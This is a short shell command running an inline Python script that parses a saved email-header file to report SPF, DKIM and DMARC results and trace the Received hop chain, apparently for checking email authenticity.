# Extract and analyze email headers for SPF/DKIM/DMARC failures
python3 -c "
import re

headers = open('email_headers.txt').read()

# Check SPF
spf = re.search(r'Received-SPF:\s*(\w+)', headers)
print(f'SPF Status: {spf.group(1) if spf else \"Not found\"}')

# Check DKIM
dkim = re.search(r'dkim=(\w+)', headers, re.IGNORECASE)
print(f'DKIM Status: {dkim.group(1) if dkim else \"Not found\"}')

# Check DMARC
dmarc = re.search(r'dmarc=(\w+)', headers, re.IGNORECASE)
print(f'DMARC Status: {dmarc.group(1) if dmarc else \"Not found\"}')

# Extract Received chain for path analysis
received = re.findall(r'from\s+([\w\.\-]+)\s+by\s+([\w\.\-]+)', headers)
for i, (src, dst) in enumerate(reversed(received)):
    print(f'  Hop {i+1}: {src} -> {dst}')
"
```
